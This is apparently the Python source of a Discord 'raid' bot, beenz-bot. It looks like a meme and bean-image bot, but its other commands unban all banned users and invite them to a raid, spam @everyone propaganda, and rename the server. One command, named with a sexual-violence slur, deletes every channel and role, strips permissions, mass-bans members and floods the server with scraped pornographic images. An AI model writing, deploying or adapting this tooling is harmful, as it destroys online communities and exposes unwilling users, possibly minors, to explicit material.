#                     ===beenz-bot v2.0===
#                       ===beenz.py===
#  ======Copyright 2020 Pr0x1mas, TheProgramableTurtle======

import discord
from discord.ext import commands as cmd
import random
import os
import imagesearch
import io
import aiohttp
import time
import inspect
from globals import *


class Client(discord.Client):
    def __init__(self):
        super().__init__() #Call parent constructor


class Bot(cmd.Bot):
    def __init__(self, version):
        super().__init__(command_prefix='$') #Call parent constructor
        self.version = version
        self.customCommands = []

    def echo(self, ctx):
        return ctx.author.id == self.user.id

    def registerCommands(self):
        self.remove_command("help")
        print("__Object Members_______________________________")
        for member in inspect.getmembers(self):
            if "discord.ext.commands.core.Command" in repr(member[1]):
                print(member)
                if not member[0] == "__init__":
                    self.customCommands.append(member[0])
        print("________________________________________")
        print("__Custom Commands_______________________")
        for customCommand in self.customCommands:
            print(customCommand)
            self.add_command(getattr(self, customCommand))
        print("________________________________________")
        
        print("__Login_________________________________")

    async def on_ready(self):
        print('Connected to Discord as')
        print(self.user.name)
        print(self.user.id)
        print("________________________________________")

    @cmd.command()
    async def h(ctx):
        # --Help command---
        await ctx.send("```beenz-bot Version " + sysversion + " \n \n Instance by Spharax \n \n Help \n \n $meme - send a meme from r/dankmemes \n \n $beans - sends a cursed bean image from r/beansinstrangeplaces```")

    @cmd.command()
    async def meme(ctx):
        # --Fake meme feature--
        memes = imagesearch.getImages("https://www.reddit.com/r/dankmemes/rising/")  # load dankmemes rising page

        anymemes = False

        for meme in memes:
            if meme.startswith("https://preview.redd.it") and not meme.startswith(
                    "https://preview.redd.it/award_images/"):
                anymemes = True
                break

        if anymemes:
            meme = random.choice(memes)  # select random image from page
            while not meme.startswith("https://preview.redd.it") or meme.startswith(
                    "https://preview.redd.it/award_images/"):  # check it is an uploaded file and not an asset
                meme = random.choice(memes)

            async with aiohttp.ClientSession() as session:  # http stuff I don't understand
                async with session.get(meme) as resp:
                    if resp.status != 200:
                        return
                    meme = meme + ".jpg"
                    data = io.BytesIO(await resp.read())
                    await ctx.send(file=discord.File(data, os.path.basename(meme)))  # send the meme
        else:
            await ctx.send("`unable to locate a meme`")
            print(memes)


    @cmd.command()
    async def beans(ctx):
        # --Fake bean feature--
        beans = imagesearch.getImages("https://www.reddit.com/r/BeansInStrangePlaces/")

        anybeans = False

        for bean in beans:
            if bean.startswith("https://preview.redd.it") and not bean.startswith(
                    "https://preview.redd.it/award_images/"):
                anybeans = True
                break

        if anybeans:
            bean = random.choice(beans)  # select random image from page
            while not bean.startswith("https://preview.redd.it") or bean.startswith(
                    "https://preview.redd.it/award_images/"):  # load dankmemes hot page: #check it is an uploaded file and not an asset
                bean = random.choice(beans)

            async with aiohttp.ClientSession() as session:  # http stuff I don't understand
                async with session.get(bean) as resp:
                    if resp.status != 200:
                        return
                    bean = bean + ".jpg"
                    data = io.BytesIO(await resp.read())
                    await ctx.send(file=discord.File(data, os.path.basename(bean)))  # send the meme
        else:
            await ctx.send("`unable to locate beans`")

    @cmd.command()
    async def dm(ctx):
        # --DM Banned users
        bannedUsers = await ctx.guild.bans()
        unban = await ctx.channel.create_invite(reason="Those who were disgraced by this server are being given an opportunity to redeem themselves by the DRH")
        print(bannedUsers)
        for ban in bannedUsers:
            user = ban.user
            await ctx.guild.unban(user, reason="Those who were disgraced by this server are being given an opportunity to redeem themselves by the DRH")
            print(user)
            print(ban)
            print(user)
            await user.send("Hi. If you're seeing this message, you were at some point banned from " + ctx.guild.name + ". Luckily for you, the Democratic Republic of Heinz has chosen to raid this server, your ban has been revoked, and you have been invited to join us on this raid.")
            await user.send(unban.url)




    @cmd.command(aliases=["spam", "echo"])
    async def propaganda(ctx, *args):
        # --Spam server with propaganda--
        print(args)
        args = [arg for arg in args]
        if len(args) == 1:
            try: # input validation for number of messages to send
                if int(args[0]) < float(args[0]):
                    await ctx.send("Please enter an integer for the number of messages")
                else:
                    for i in range(int(args[0])):
                        await ctx.send(
                            "@everyone THIS SERVER HAS BEEN CLAIMED AS A COLONY OF THE DEMOCRATIC REPUBLIC OF HEINZ")
                        await ctx.send(file=discord.File('assets/flag.png'))
                        await ctx.send("Join us: https://discord.gg/JPT9536")
            except ValueError:
                await ctx.send("Please enter an integer for the number of messages")

        elif len(args) > 1:
            try: # input validation for number of messages to send
                if int(args[0]) < float(args[0]):
                    await ctx.send("Please enter an integer for the number of messages")
                else:
                    for i in range(int(args[0])):
                        await ctx.send(" ".join(args[1:]))
            except ValueError:
                await ctx.send("Please enter an integer for the number of messages")
        else:
            for i in range(2):
                await ctx.send(
                    "@everyone THIS SERVER HAS BEEN CLAIMED AS A COLONY OF THE DEMOCRATIC REPUBLIC OF HEINZ")
                await ctx.send(file=discord.File('assets/flag.png'))
                await ctx.send("Join us: https://discord.gg/JPT9536")

    @cmd.command()
    async def colony(ctx):

        originalname = ctx.guild.name
        # --Claim the server as a colony of Heinz--
        await ctx.guild.edit(name="Colony of The Democratic Republic Of Heinz")  # change server name

        with open(os.path.join(os.path.dirname(__file__), "assets/flag.png"), 'rb') as f:
            await ctx.guild.edit(icon=f.read())  # change server icon

    @cmd.command()
    async def rape(ctx, *args):
        global originalname

        # --Destroy the server--
        
        # -delete all channels-
        channels = []
        for channel in ctx.guild.channels:  # get all channels
            channels.append(channel)

        for channel in channels:
            await channel.delete(
                reason="THIS SERVER HAS BEEN CLAIMED AS A COLONY OF THE DEMOCRATIC REPUBLIC OF HEINZ")

        # -make new channel-
        bot = ctx.bot
        heinz = await ctx.guild.create_text_channel('HEINZ')
        await heinz.send("@everyone THIS SERVER HAS BEEN CLAIMED AS A COLONY OF THE DEMOCRATIC REPUBLIC OF HEINZ")

        # -log the rape-
        #for guild in ctx.bot.guilds:
        #    if guild.name == "beenzbot-Log":
        #        logserver = guild
        
        #if originalname == None:
        #    originalname = heinz.guild.name
            

        unban = await heinz.create_invite(reason="Those who were disgraced by this server are being given an opportunity to redeem themselves by the DRH")
        #await logserver.channels[0].send("@everyone new raid: " + originalname)
        #await logserver.channels[0].send("Join the fun at " + unban.url)

        #originalname = None

        # -delete all roles-
        roles = []

        for role in heinz.guild.roles:  # get all roles
            roles.append(role)

        for role in roles:
            try:
                await role.delete(reason="THIS SERVER HAS BEEN CLAIMED AS A COLONY OF THE DEMOCRATIC REPUBLIC OF HEINZ")
            except Exception:
                pass

        # -remove all perms-
        perms = discord.Permissions()  # create new empty permissions object
        perms.update(read_messages=True)  # make it so user can see messages

        for role in roles:
            if role.name == "@everyone":  # get only @everyone role
                await role.edit(permissions=perms)  # apply new permissions

        # -spam images-

        if len(args) == 0:
            hentai = imagesearch.getImages("https://hentaihaven.xxx") # load images from source or hentai from hentaihaven (kill me now)
        elif len(args) == 1:
            if args[0] == "instantban":
                hentai = imagesearch.getImages("https://hentaihaven.xxx")
            else:
                hentai = imagesearch.getImages(str(args[0]))
        elif len(args) > 1:
            hentai = imagesearch.getImages(str(args[1]))


        for i in range(10):  # send some hentai before banning users
            if len(args) > 0:
                if args[0] == "instantban": # skip pre-ban hentai if "instantban" supplied as argument
                    break

            y = random.choice(hentai)  # get random bit of hentai
            if len(args) > 0:
                while not y.startswith("https://hentaihaven.xxx/www/") and not len(args) > 0:  # check it is a video preview and not an asset
                    y = random.choice(hentai)

            async with aiohttp.ClientSession() as session:  # http stuff I don't understand
                async with session.get(y) as resp:
                    if resp.status != 200:
                        return await heinz.send('`error loading image`')
                    data = io.BytesIO(await resp.read())
                    await heinz.send(file=discord.File(data, os.path.basename(y)))  # send hentai

        time.sleep(5)

        for member in heinz.guild.members:
            try:
                await member.ban()
            except Exception:
                pass

        
            for i in range(1000):  # send hentai until bot is banned
                try:
                    y = random.choice(hentai)  # get random bit of hentai
                    if len(args) == 1:
                        if args[0] == "instantban":
                            while not y.startswith("https://hentaihaven.xxx/www/"):  # check it is a video preview and not an asset
                                y = random.choice(hentai)
                    elif len(args) == 0:
                        while not y.startswith("https://hentaihaven.xxx/www/"):  # check it is a video preview and not an asset
                            y = random.choice(hentai)

                    async with aiohttp.ClientSession() as session:  # http stuff I don't understand
                        async with session.get(y) as resp:
                            if resp.status != 200:
                                return await heinz.send('`error loading image`')
                            data = io.BytesIO(await resp.read())
                            await heinz.send(file=discord.File(data, os.path.basename(y)))  # send hentai
                except Exception:
                    break
